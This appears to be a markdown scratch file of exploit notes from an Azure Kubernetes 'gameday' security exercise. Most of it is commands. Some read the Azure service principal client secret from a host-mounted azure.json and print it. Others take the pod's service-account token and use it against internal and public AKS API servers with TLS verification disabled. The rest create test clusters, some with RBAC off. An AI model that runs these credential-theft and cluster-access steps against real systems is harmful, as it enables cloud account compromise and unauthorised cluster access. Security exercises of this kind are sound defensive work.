# Exploit Notes

## Host mount
cat /meshconfig/azure.json > azure.json
echo 'Azure SPN: ' $(cat azure.json | jq '. | {s:.subscriptionId, c:.aadClientId, p:.aadClientSecret, t: .tenantId}')




## Without Success: Cluster Admin
./kubectl get pods --server='https://kubernetes.default.svc.cluster.local' --token=$(cat token.txt) --insecure-skip-tls-verify=true


kubectl get pods --server='https://gameday-ex-gameday-rg-a4baed-bb1c2c10.hcp.westeurope.azmk8s.io' --token=$(cat token.txt) --insecure-skip-tls-verify=true


KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods/$HOSTNAME


      https://gameday-ex-gameday-rg-a4baed-bb1c2c10.hcp.westeurope.azmk8s.io/api/v1/namespaces/default/pods/$HOSTNAME


      https://10.0.0.1:443/api/v1/namespaces/default/pods/$HOSTNAME


      $KUBERNETES_SERVICE_PORT = 443

      curl https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/



      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/ >> https://10.0.0.1:443/


KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
      https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods/$HOSTNAME




# Point to the internal API server hostname
APISERVER=https://kubernetes.default.svc

# Path to ServiceAccount token
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount

# Read this Pod's namespace
NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)

# Read the ServiceAccount bearer token
TOKEN=$(cat ${SERVICEACCOUNT}/token)

# Reference the internal certificate authority (CA)
CACERT=${SERVICEACCOUNT}/ca.crt

# Explore the API with TOKEN
curl --max-time 5 --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api


# Without RBAC - using directly the public API server URL
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET https://gameday-ex-gameday-rg-a4baed-efde364a.hcp.westeurope.azmk8s.io/api

# With RBAC - using directly the public API server URL
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET https://gameday-ex-gameday-rg-a4baed-bb1c2c10.hcp.westeurope.azmk8s.io/api




      /var/run/secrets/kubernetes.io/serviceaccount/ca.crt


      --token-auth-file=/var/run/secrets/kubernetes.io/serviceaccount/token 


./kubectl get pods --server='https://10.0.0.1:443' --token=$(cat token.txt) --insecure-skip-tls-verify=true 



# Useful

## New AKS
az aks create -n gameday-exploit-cluster2 -g gameday-rg --generate-ssh-keys --attach-acr gamedayexploitreg
az aks get-credentials -n gameday-exploit-cluster2 -g gameday-rg

az aks create -n gameday-exploit-cluster-disrbac -g gameday-rg --generate-ssh-keys --disable-rbac --attach-acr gamedayexploitreg
az aks get-credentials -n gameday-exploit-cluster-disrbac -g gameday-rg


## New AKS with kubenet
```
RG_NAME=gameday-rg
VNET_NAME=gameday-vnet
CLUSTER_NAME=gameday-exploit-kubnet-rbac
az network vnet create \
    --resource-group $RG_NAME \
    --name $VNET_NAME \
    --address-prefixes 192.168.0.0/16 \
    --subnet-name myAKSSubnet \
    --subnet-prefix 192.168.1.0/24

az ad sp create-for-rbac --skip-assignment

VNET_ID=$(az network vnet show --resource-group $RG_NAME --name $VNET_NAME --query id -o tsv)
SUBNET_ID=$(az network vnet subnet show --resource-group $RG_NAME --vnet-name $VNET_NAME --name myAKSSubnet --query id -o tsv)

az role assignment create --assignee <appId> --scope $VNET_ID --role "Network Contributor"

az aks create \
    --resource-group $RG_NAME \
    --name $CLUSTER_NAME \
    --network-plugin kubenet \
    --service-cidr 10.0.0.0/16 \
    --dns-service-ip 10.0.0.10 \
    --pod-cidr 10.244.0.0/16 \
    --docker-bridge-address 172.17.0.1/16 \
    --vnet-subnet-id $SUBNET_ID \
    --service-principal <appId> \
    --client-secret <password>
```

## Bash
k exec -it blackboxgameengine-868d84466c-9jmbf --container istio-proxy -- /bin/bash

## Install kubectl
curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x ./kubectl
cat /var/run/secrets/kubernetes.io/serviceaccount/token > token.txt

## JSON Parser
curl -Lo jq "https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64"
chmod +x ./jq
export PATH=$PATH:/app